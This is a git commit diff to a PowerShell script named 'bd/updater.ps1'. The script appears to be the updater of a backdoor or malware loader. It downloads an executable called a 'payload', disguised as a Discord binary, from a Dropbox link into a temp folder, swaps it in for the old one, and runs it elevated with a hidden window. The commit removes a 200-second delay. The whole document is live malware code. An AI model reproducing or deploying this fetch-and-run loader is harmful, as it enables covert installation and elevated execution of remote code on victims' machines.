1fe4879a0eb65858bd8f89bcf56d56f7f8cfc1a1
blousekool <132397759+blousekool@users.noreply.github.com>
2023-08-09 22:05:28 +0200

    Update updater.ps1

--- bd/updater.ps1
+++ bd/updater.ps1
@@ -4,16 +4,11 @@ cd $env:temp/sVBXKuz
 #download updated payload
 Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile new_wsappa.exe
 
-
-start-sleep 200
-
 #remove old payload
 remove-item wsappa.exe
 
 #change name
 rename-item new_wsappa.exe wsappa.exe
-
-
 
 #start new payload
 Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden
